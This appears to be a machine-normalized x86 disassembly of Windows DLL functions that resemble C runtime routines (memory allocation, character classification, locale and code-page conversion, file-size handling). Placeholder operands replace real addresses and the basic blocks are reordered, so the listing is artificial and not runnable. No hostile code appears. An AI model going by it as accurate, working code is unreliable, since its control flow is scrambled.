mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_1001840b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1001a3b9
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1001a363
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_1001a3e9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_1001840b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1001a43a
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1001a3e9
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_1001a468
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffff
je r-xdata
push esi
call sub_10012f31
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
test al al
jns r-xdata
call sub_1001034f
xor edi edi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov edi eax
sar edi 0x5
shl ecx 0x6
add ecx [ edi * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_10018661
pop ecx
test al 0x2
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] edi
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop ebx
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
sub_1001a559
push 0xc
push r--data
call sub_10011e54
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_1001034f
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_100102e7
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_10011e99
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_1001347b
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_1001135a
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_10011b6c
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a655
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_1000ebe0
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_1001a677
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_1000d6b9
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_1001a867
pop ecx
mov ebx eax
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0xc
call sub_100102e7
add esp 0x14
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_1000ebe0
add esp 0xc
sub_1001a6f2
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x28 ] eax
cmp eax edi
jne r-xdata
cmp esi edi
je r-xdata
call sub_1001034f
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
xor eax eax
jmp r-xdata
cmp ecx edi
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1000c176
leave
retn
push 0x8
pop ecx
xor eax eax
lea edi [ ebp - 0x24 ]
push 0x7
[ edi ]
pop edi
push ebx
cmp [ eax ] edi
je r-xdata
mov dl [ esi ]
movzx ecx dl
mov eax ecx
and ecx edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc esi
test dl dl
jne r-xdata
mov edx [ ebp - 0x2c ]
test edx edx
jne r-xdata
mov al [ edx ]
movzx esi al
xor ebx ebx
mov ecx esi
and ecx edi
inc ebx
shl ebx cl
shr esi 0x3
mov cl [ ebp + esi - 0x24 ]
test cl bl
jne r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ eax ]
jmp r-xdata
test al al
je r-xdata
mov ebx edx
jmp r-xdata
inc edx
cmp [ edx ] 0x0
jne r-xdata
movzx esi [ edx ]
xor eax eax
mov ecx esi
and ecx edi
inc eax
shl eax cl
shr esi 0x3
mov cl [ ebp + esi - 0x24 ]
test cl al
jne r-xdata
jmp r-xdata
mov [ edx ] 0x0
inc edx
inc edx
mov eax [ ebp - 0x28 ]
mov [ eax ] edx
mov eax ebx
sub eax edx
neg eax
sbb eax eax
and eax ebx
pop ebx
sub_1001a7e0
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
push edi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop esi
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
call sub_10014870
pop ecx
mov edi eax
jmp r-xdata
call sub_1001b05b
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_10014870
pop ecx
cmp eax edi
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_1001b041
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
sub_1001a867
push 0x10
push r--data
call sub_10011e54
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_1001034f
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_100102e7
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_1001135a
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_1001138d
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_10011e99
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a901
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_1001a913
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_1001747c
test eax eax
je r-xdata
push 0xa
call sub_10013288
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_10017489
pop ecx
push 0x3
call sub_1000e925
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_1000ebe0
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_1001aa2a
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_1000d698
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000c176
leave
retn
sub_1001aa73
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000c176
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_1000ebe0
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_100176c6
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_1000cef2
pop ecx
cmp eax edi
je r-xdata
call sub_1001ac30
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_10014870
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_100159c7
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_1000c3e9
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_1001ac5c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_100184c3
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_1001034f
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_100184c3
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_100184c3
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100184c3
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_1001ae12
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_1001034f
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_10019872
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_1001034f
mov [ eax ] 0xd
call sub_10010362
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_10010362
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_1001034f
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_100134a3
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_1001ae12
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_1001ae12
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov eax [ edx ]
and esi 0x1f
shl esi 0x6
lea ecx [ eax + esi ]
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_1001aece
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_1001034f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_1001af26
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_1001af53
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1001b480
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001b4c2
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001b05b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_100159c7
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_1000c3e9
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_1001b668
pop ecx
pop ecx
test eax eax
jge r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x4 ]
call sub_1000c3e9
pop ecx
mov [ ebp - 0x4 ] esi
sub_1001b0f2
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
sub_1001b110
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
push edi
xor edi edi
mov ebx edx
mov esi ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
push 0x1
mov eax r--data
push eax
push 0x1
push eax
push edi
push edi
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jge r-xdata
push [ ebp + 0x10 ]
mov eax ebx
call sub_1001b0f2
pop ecx
mov [ ebp + 0x10 ] eax
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov edx [ ebp + 0x18 ]
cmp edx edi
jle r-xdata
xor eax eax
jmp r-xdata
cmp edx 0xffffffff
jl r-xdata
mov eax [ ebp - 0x1c ]
push edx
call sub_1001b0f2
mov edx eax
pop ecx
mov [ ebp + 0x18 ] edx
jmp r-xdata
mov [ rw-data ] 0x2
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000c176
leave
retn
mov ecx [ rw-data ]
cmp ecx 0x2
je r-xdata
xor edi edi
xor ebx ebx
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp ecx edi
je r-xdata
cmp [ ebp + 0x1c ] edi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
xor eax eax
inc eax
cmp ecx eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_1001aa2a
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov [ ebp - 0x28 ] edi
cmp [ ebp + 0x1c ] edi
jne r-xdata
cmp esi [ ebp + 0x1c ]
je r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0x1c ] ecx
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push 0x0
lea eax [ ebp + 0x10 ]
push eax
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x1c ]
call sub_1001aa73
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
cmp edx edi
jne r-xdata
mov eax esi
push ebx
call sub_1000c3e9
push edi
call sub_1000c3e9
pop ecx
pop ecx
push 0x0
push 0x0
lea eax [ ebp + 0x18 ]
push eax
push [ ebp - 0x1c ]
push esi
push [ ebp + 0x1c ]
call sub_1001aa73
mov edi eax
add esp 0x18
test edi edi
jne r-xdata
cmp edx eax
jg r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push edi
push edi
push [ ebp + 0x10 ]
push ebx
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
cmp ebx edi
je r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] edi
push ebx
call sub_1000c3e9
pop ecx
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jle r-xdata
mov edi 0x400
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x20 ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
cmp [ ebp + 0x18 ] edi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x20 ]
call sub_100176c6
mov eax [ ebp - 0x28 ]
pop ecx
jmp r-xdata
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_1000cef2
pop ecx
test eax eax
je r-xdata
call sub_1001ac30
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jae r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
